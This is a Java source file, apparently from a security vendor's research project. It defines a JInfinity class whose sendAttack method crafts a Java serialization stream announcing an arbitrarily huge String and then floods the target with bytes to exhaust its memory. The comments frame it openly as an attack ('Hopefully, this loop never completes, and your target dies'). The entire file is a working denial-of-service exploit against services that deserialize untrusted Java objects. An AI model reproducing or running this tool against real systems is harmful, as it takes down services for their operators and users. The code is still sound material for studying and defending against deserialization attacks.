package com.contrastsecurity.jinfinity;

import static java.io.ObjectStreamConstants.STREAM_VERSION;
import static java.io.ObjectStreamConstants.TC_LONGSTRING;
import static java.io.ObjectStreamConstants.TC_STRING;

import java.io.IOException;
import java.io.OutputStream;

/**
 * A component for sending an arbitrarily large serialized String to an OutputStream.
 */
public class JInfinity {
	
	private JInfinityProgressListener listener;
	private int callbackFrequency;
	
	public void setListener(JInfinityProgressListener listener, int callbackFrequency) {
		this.listener = listener;
		this.callbackFrequency = callbackFrequency;
	}
	
	/**
	 * Sends a String of arbitrary length to a stream. This makes it easier to scale attacks.
	 * @param os the OutputStream to which you want to send the attack
	 * @param payloadSize the size of the serialized String you want to send
	 * @throws IOException
	 */
	public void sendAttack(final OutputStream os, final long payloadSize) throws IOException {
		
		if(payloadSize < 0 || payloadSize % 2 != 0) {
			throw new IllegalArgumentException("Payload size must be an even, non-negative number");
		}
		
		/*
		 * Write the header.
		 */
		os.write(0xAC);
		os.write(0xED);
		
		os.write(0);
		os.write(STREAM_VERSION);
		
		/*
		 * Tell them it's a String of a certain size.
		 */
		if(payloadSize <= 0xFFFF) {
			os.write(TC_STRING);
			os.write((int)payloadSize >>> 8);
			os.write((int)payloadSize);
		} else {
			os.write(TC_LONGSTRING);
			os.write((int)(payloadSize >>> 56));
			os.write((int)(payloadSize >>> 48));
			os.write((int)(payloadSize >>> 40));
			os.write((int)(payloadSize >>> 32));
			os.write((int)(payloadSize >>> 24));
			os.write((int)(payloadSize >>> 16));
			os.write((int)(payloadSize >>>  8));
			os.write((int)(payloadSize >>>  0));
		}
		
		/*
		 * Start delivering the payload. Hopefully, this loop never 
		 * completes, and your target dies.
		 */
		try {
			for(long i=0;i<payloadSize;i++) {
				os.write((byte)'B');
				if(listener != null && payloadSize % callbackFrequency == 0) {
					listener.onChunkWritten(i);
				}
			}
		} catch(IOException e) {
			System.err.println("[!] Possible success. Couldn't communicate with host.");
		}
	}

}
